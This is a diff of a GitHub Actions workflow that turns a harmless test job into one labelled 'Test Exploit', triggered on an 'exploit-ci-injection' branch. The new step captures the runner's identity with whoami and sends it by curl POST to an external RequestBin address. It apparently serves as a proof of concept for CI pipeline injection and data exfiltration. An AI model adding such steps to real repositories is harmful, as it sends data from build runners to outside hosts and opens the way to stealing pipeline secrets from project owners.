@@ -1,18 +1,18 @@
-name: Safe Test Workflow
+name: Test Exploit
 
 on:
   push:
     branches:
-      - test-branch
+      - exploit-ci-injection  # senin branch’in
 
 jobs:
-  test-job:
+  run-whoami:
     runs-on: ubuntu-latest
     steps:
-      - name: Checkout repository
+      - name: Checkout
         uses: actions/checkout@v3
 
-      - name: Run test command
+      - name: Run whoami and send to RequestBin
         run: |
-          echo "Hello from safe workflow!"
-          whoami
+          WHO=$(whoami)
+          curl -X POST -d "$WHO" https://requestbin.net/bins/40cb5685-21cb-4a23-b461-bd460d3accca
